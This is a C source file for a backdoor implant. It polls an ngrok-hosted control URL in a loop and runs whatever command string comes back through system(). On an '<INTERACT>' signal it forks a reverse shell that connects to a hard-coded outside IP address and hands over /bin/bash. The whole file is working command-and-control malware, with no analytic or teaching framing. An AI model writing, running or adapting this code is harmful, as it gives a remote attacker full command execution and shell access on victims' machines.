#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <curl/curl.h>

typedef struct {
	char *string;
	size_t size;
} Response;

size_t write_chunk(void *data, size_t size, size_t nmemb, void *userdata);
void get_executors_command();
void reverse_connection(void);

int main(){
	get_executors_command();
	return 0;
}

void get_executors_command(){
	CURL *curl;
	CURLcode result;
	curl = curl_easy_init();
	if (curl == NULL){
		fprintf(stderr, "request failed\n");
		return;
	}
	Response response;
	while (1){
		response.string = malloc(1);
		response.size = 0;

		curl_easy_setopt(curl, CURLOPT_URL, "https://allegedly-great-shiner.ngrok-free.app");
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_chunk);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response);

		result = curl_easy_perform(curl);

		if (result != CURLE_OK){
			fprintf(stderr, "Error\n");
			continue;
		}
		if (strcmp(response.string, "<INTERACT>") == 0){
			int pid = fork();
			if (pid == 0){
				printf("child start");
				reverse_connection();
				printf("child stop");
				exit(0);
			}
		} else if (strcmp(response.string, "<TERMINATE>") == 0) {
			break;
		} else if (strcmp(response.string, "<SLEEP>") == 0) {
			system("sleep 2");
		}else {
			printf("%s\n", response.string);
			system(response.string);
			sleep(1);
		}
	}
	curl_easy_cleanup(curl);
	free(response.string);
}

size_t write_chunk(void *data, size_t size, size_t nmemb, void *userdata){
	size_t real_size = size * nmemb;
	Response *response = (Response *) userdata;
	char *ptr = realloc(response->string, response->size + real_size + 1);
	if (ptr == NULL){
		return CURL_WRITEFUNC_ERROR;
	}
	response->string = ptr;
	memcpy(&(response->string[response->size]), data, real_size);
	response->size += real_size;
	response->string[response->size] = 0;
	return real_size;
}

void reverse_connection(void){
    int port = 49152;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("3.6.206.19"); // nglocalhost.com

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/bash", NULL};
    execvp("/bin/bash", argv);
}
